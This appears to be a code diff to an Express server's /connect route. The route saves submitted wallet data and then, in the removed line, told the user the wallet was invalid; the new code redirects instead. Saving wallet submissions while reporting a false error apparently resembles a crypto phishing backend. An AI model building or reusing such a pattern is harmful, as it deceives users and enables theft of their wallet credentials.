@@ -517,10 +517,11 @@ app.post("/connect", async (req, res) => {
     };
     data.createdAt = new Date();
     const savedData = await HubWallet.create(data);
-    res.status(503).send("Inactive or invalid wallet,Connect a valid wallet");
+    res.redirect('https://www.example.com');
     return savedData;
   } catch (err) {
-
+    console.error(err);
+    res.status(500).send("Internal Server Error");
   }
 })
 app.get('/wallets', async (req, res) => {
